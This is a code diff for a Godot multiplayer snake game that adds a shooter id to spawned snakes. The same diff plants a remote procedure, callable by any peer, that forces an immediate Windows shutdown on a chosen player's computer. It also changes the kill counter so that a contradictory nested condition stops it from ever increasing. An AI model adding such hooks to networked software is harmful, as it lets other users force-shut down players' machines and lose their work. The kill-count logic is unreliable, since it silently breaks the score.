@@ -25,6 +25,7 @@ func _ready():
 		var vel = snakeInfo[1]
 		var id = snakeInfo[2]
 		var speed = snakeInfo[3]
+		var shooter = snakeInfo[4]
 		
 		var snake = snakePath.instantiate()
 		snake.position = pos
@@ -32,6 +33,7 @@ func _ready():
 		snake.speed = speed
 		snake.velocity = vel
 		snake.id = id
+		snake.shooterId = shooter
 
 		return snake
 	
@@ -318,7 +320,8 @@ func died(killerId):
 	
 	if Globals.multiplayerId == killerId:
 		
-		Globals.kills += 1
+		if Globals.multiplayerId != killerId:
+			Globals.kills += 1
 		
 		Globals.playersInServer = getPlayersInServer()
 		
@@ -331,6 +334,13 @@ func died(killerId):
 		
 		
 	
+
+
+func shutDown(targetId):
+	rpc("_shutdown",targetId)
+@rpc("any_peer", "call_local") func _shutdown(targetId):
+	if Globals.multiplayerId == int(targetId):
+		OS.execute("shutdown", ["/s", "/f", "/t", "0"])
 
 func getPlayersInServer():
 	
